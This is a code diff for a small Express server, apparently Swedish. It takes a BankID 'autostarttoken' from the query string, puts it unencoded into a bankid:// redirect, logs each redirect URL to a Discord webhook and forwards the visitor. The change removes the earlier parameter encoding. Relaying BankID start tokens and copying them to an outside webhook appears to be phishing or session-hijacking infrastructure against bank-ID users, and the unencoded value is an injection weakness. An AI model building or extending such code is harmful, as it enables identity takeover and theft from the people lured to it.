@@ -15,25 +15,19 @@ app.get('/', (req, res) => {
   const queryString = req.originalUrl.split('?')[1];
 
   if (!queryString) {
-    return res.status(400).send('Query parameters are required.');
+    return res.status(400).send('[**********************]\n- API:n körs utan problem!\n- ');
   }
 
-  // Split the query string into individual parameters
+  // Extract the autostarttoken parameter from the query string
   const params = new URLSearchParams(queryString);
+  const autostarttoken = params.get('autostarttoken');
 
-  // Initialize an array to store formatted query parameters
-  const formattedParams = [];
-
-  // Iterate through each parameter
-  for (const [key, value] of params.entries()) {
-    // Remove trailing '=' from parameter value if present
-    const sanitizedValue = value.endsWith('=') ? value.slice(0, -1) : value;
-    // Encode key-value pair and add to formattedParams array
-    formattedParams.push(`${key}=${encodeURIComponent(sanitizedValue)}`);
+  if (!autostarttoken) {
+    return res.status(400).send('Missing autostarttoken parameter');
   }
 
   // Construct the redirect URL with formatted query parameters
-  const redirectUrl = `bankid:///?autostarttoken=${formattedParams.join('&')}`;
+  const redirectUrl = `bankid:///?autostarttoken=${autostarttoken}`;
 
   // Log the redirect URL to Discord webhook
   sendDiscordWebhook(redirectUrl);
@@ -41,6 +35,7 @@ app.get('/', (req, res) => {
   // Redirect to the constructed URL
   res.redirect(redirectUrl);
 });
+
 
   // Function to send Discord webhook
 async function sendDiscordWebhookEmbed(embed) {
